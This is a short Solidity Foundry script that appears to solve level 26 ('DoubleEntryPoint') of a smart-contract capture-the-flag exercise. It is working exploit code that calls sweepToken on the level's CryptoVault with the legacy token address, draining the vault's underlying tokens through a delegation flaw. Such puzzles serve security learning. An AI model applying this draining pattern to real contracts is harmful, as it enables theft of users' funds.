// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../instances/Ilevel26.sol";

contract POC is Script {

     DoubleEntryPoint level26 = DoubleEntryPoint(0x2Ed94c3A567583D36F8AF55D5226a3aE4d847393);
    function run() external{
        vm.startBroadcast();

        CryptoVault vault = CryptoVault(level26.cryptoVault());
        address DET = address(vault.underlying());
        address LGT = level26.delegatedFrom();
        vault.sweepToken(IERC20(LGT)); //calling sweepToken with LGT address on the CryptoVault

        vm.stopBroadcast();
    }
}

